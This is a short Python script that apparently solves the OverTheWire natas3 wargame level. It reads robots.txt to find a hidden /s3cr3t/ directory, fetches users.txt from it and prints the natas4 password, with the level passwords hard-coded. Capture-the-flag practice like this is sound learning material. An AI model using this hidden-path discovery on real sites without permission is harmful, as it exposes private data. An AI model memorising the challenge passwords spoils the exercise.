import requests
import bs4
import re


# configuration for natas3
USERNAME = 'natas3'
PASSWORD = 'sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14'
URL = 'http://natas3.natas.labs.overthewire.org'
AUTH = requests.auth.HTTPBasicAuth(USERNAME, PASSWORD)


session = requests.Session()
session.auth = AUTH
response = session.get(url=URL)
soup = bs4.BeautifulSoup(response.text, 'html.parser')
body = soup.find('body')
div_content = body.find('div', {'id' : 'content'})
print(f'{div_content}\n')


# reference: https://support.google.com/webmasters/answer/6062608?hl=en
# the comment indicates the existence of robots.txt
# it says that even the google's crawler won't be able to find the password
response = session.get(url=URL + '/robots.txt')
print(f'{response.text}\n')


# in robots.txt, we find /s3cr3t/ directory
s3cr3t = re.search(r'Disallow: (/\w+/)', response.text).group(1)
response = session.get(url=URL + s3cr3t)
soup = bs4.BeautifulSoup(response.text, 'html.parser')
a = soup.find('a', {'href' : 'users.txt'})
print(f'{a}\n')
# in /s3cr3t directory, we find that it contains users.txt
# here, we used .+ instead of \w+ as the file contains a dot, which is not an alphanumeric character
users = re.search(r'>(.+)<', str(a)).group(1)


# natas4 password: Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
response = session.get(url=URL + s3cr3t + users)
password = re.search(r'natas4:(\w+)', response.text).group(1)
print(f'natas4 password: {password}')